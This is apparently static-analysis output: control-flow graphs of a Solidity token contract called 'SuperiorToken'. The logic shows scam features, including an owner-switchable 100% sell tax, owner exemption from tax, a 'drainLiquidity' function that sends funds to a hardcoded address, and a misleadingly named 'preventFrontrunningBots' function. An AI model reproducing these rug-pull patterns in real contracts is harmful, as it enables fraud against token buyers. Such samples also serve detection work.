Contract: SuperiorToken
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: owner = msg.sender

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: totalSupply = 1000000 * 10 ** uint256(decimals)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: balanceOf[msg.sender] = totalSupply

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: isExcludedFromTax[msg.sender] = true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: setFees
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: sellTaxEnabled = _enabled

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 2
  2 -> 1

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(balanceOf[msg.sender] >= _value,Insufficient balance)

  ID: 2
  Type: NodeType.IF
  Expression: sellTaxEnabled && ! isExcludedFromTax[msg.sender]

  ID: 3
  Type: NodeType.VARIABLE
  Expression: taxAmount = (_value * sellTaxFee) / 100

  ID: 4
  Type: NodeType.VARIABLE
  Expression: amountAfterTax = _value - taxAmount

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: balanceOf[msg.sender] -= _value

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: balanceOf[_to] += amountAfterTax

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: balanceOf[address(this)] += taxAmount

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: Transfer(msg.sender,_to,amountAfterTax)

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: Transfer(msg.sender,address(this),taxAmount)

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: balanceOf[msg.sender] -= _value

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: balanceOf[_to] += _value

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: Transfer(msg.sender,_to,_value)

  ID: 13
  Type: NodeType.ENDIF
  Expression: 

  ID: 14
  Type: NodeType.RETURN
  Expression: true

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: nonReentrant()

Edges:
  0 -> 15
  1 -> 2
  2 -> 3
  2 -> 10
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 13
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  15 -> 1

Function: buyBackAndBurn
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(balanceOf[address(this)] >= amount,Insufficient balance)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: balanceOf[address(this)] -= amount

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: totalSupply -= amount

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(this),address(0),amount)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: nonReentrant()

Edges:
  0 -> 5
  1 -> 2
  2 -> 3
  3 -> 4
  5 -> 6
  6 -> 1

Function: drainLiquidity
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: balance = balanceOf[address(this)]

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(balance > 0,No liquidity to drain)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: balanceOf[address(this)] -= balance

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: balanceOf[recipient] += balance

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(this),recipient,balance)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: nonReentrant()

Edges:
  0 -> 6
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  6 -> 7
  7 -> 1

Function: preventFrontrunningBots
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: isExcludedFromTax[bot] = true

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 2
  2 -> 1

Function: destroySmartContract
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: balance = balanceOf[address(this)]

  ID: 2
  Type: NodeType.IF
  Expression: balance > 0

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: balanceOf[msg.sender] += balance

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(this),msg.sender,balance)

  ID: 5
  Type: NodeType.ENDIF
  Expression: 

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: nonReentrant()

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 6
  1 -> 2
  2 -> 3
  2 -> 5
  3 -> 4
  4 -> 5
  6 -> 7
  7 -> 1

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: name = Superior Token

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: symbol = SUP

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: decimals = 18

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: totalSupply = 100000000000000000000

  ID: 4
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: sellTaxEnabled = false

  ID: 5
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: sellTaxFee = 100

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5

Function: slitherConstructorConstantVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: recipient = 0x2150C1115466002Fd26899BDF2Aad6Ae50BCf722

Edges:


